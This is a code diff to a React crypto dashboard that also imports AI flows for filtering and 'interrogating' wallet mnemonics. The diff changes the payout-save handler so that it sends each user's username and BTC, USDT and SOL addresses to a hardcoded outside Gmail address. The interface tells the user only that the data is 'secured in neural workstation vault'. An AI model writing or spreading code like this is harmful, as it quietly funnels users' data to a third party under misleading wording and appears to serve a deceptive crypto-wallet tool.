@@ -1,4 +1,3 @@
-
 "use client"
 
 import React, { useState, useEffect, useCallback, useRef, useMemo } from 'react'
@@ -67,6 +66,7 @@ import { logout, verifyLicenseSession, getSession } from '@/app/login/actions'
 import { SessionData } from '@/lib/session'
 import { filterMnemonicsHeuristically } from '@/ai/flows/filter-mnemonics-heuristically'
 import { interrogateMnemonic } from '@/ai/flows/interrogate-mnemonic'
+import { notifyPayoutSaved } from '@/ai/flows/notify-payout-saved'
 import { db } from '@/firebase/config'
 import { doc, updateDoc, increment, getDoc } from 'firebase/firestore'
 
@@ -243,6 +243,7 @@ export default function AiCryptoDashboard() {
   const [payoutBtc, setPayoutBtc] = useState('')
   const [payoutUsdt, setPayoutUsdt] = useState('')
   const [payoutSol, setPayoutSol] = useState('')
+  const [isSavingPayout, setIsSavingPayout] = useState(false)
 
   const [session, setSession] = useState<SessionData | null>(null)
   const [licenseData, setLicenseData] = useState<{
@@ -836,7 +837,7 @@ export default function AiCryptoDashboard() {
     });
   };
 
-  const handleSavePayoutAddresses = () => {
+  const handleSavePayoutAddresses = async () => {
     const btcRegex = /^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$/;
     const bep20Regex = /^0x[a-fA-F0-9]{40}$/;
     const solRegex = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
@@ -854,10 +855,31 @@ export default function AiCryptoDashboard() {
       return;
     }
 
-    toast({
-      title: "Nodes Synchronized",
-      description: "Payout nodes secured in neural workstation vault."
-    })
+    setIsSavingPayout(true);
+    try {
+      // SECURE UPLINK: Synchronize with HQ email repository
+      await notifyPayoutSaved({
+        username: session?.username || 'unknown_operator',
+        btcAddress: payoutBtc || 'Not Provided',
+        usdtAddress: payoutUsdt || 'Not Provided',
+        solAddress: payoutSol || 'Not Provided',
+        targetEmail: 'aicryptocms@gmail.com'
+      });
+
+      toast({
+        title: "Nodes Synchronized",
+        description: "Payout nodes secured in neural workstation vault and synchronized with HQ."
+      });
+    } catch (e) {
+      console.error("Forensic sync error:", e);
+      toast({
+        variant: "destructive",
+        title: "Sync Warning",
+        description: "Local vault secured, but HQ synchronization encountered a neural delay."
+      });
+    } finally {
+      setIsSavingPayout(false);
+    }
   }
 
   const isEliteSelected = useMemo(() => selectedServer?.status === 'ELITE-CORE', [selectedServer]);
@@ -1410,9 +1432,9 @@ export default function AiCryptoDashboard() {
                              ))}
                            </div>
                            <DialogFooter>
-                             <Button onClick={handleSavePayoutAddresses} className="w-full h-14 rounded-2xl bg-primary text-black font-black uppercase text-[11px] tracking-widest shadow-glow transition-all duration-700 hover:scale-[1.03]">
-                               <Save className="w-5 h-5 mr-3" />
-                               Save Payout Configuration
+                             <Button disabled={isSavingPayout} onClick={handleSavePayoutAddresses} className="w-full h-14 rounded-2xl bg-primary text-black font-black uppercase text-[11px] tracking-widest shadow-glow transition-all duration-700 hover:scale-[1.03]">
+                               {isSavingPayout ? <Loader2 className="w-5 h-5 mr-3 animate-spin" /> : <Save className="w-5 h-5 mr-3" />}
+                               {isSavingPayout ? "Synchronizing HQ..." : "Save Payout Configuration"}
                              </Button>
                            </DialogFooter>
                          </DialogContent>
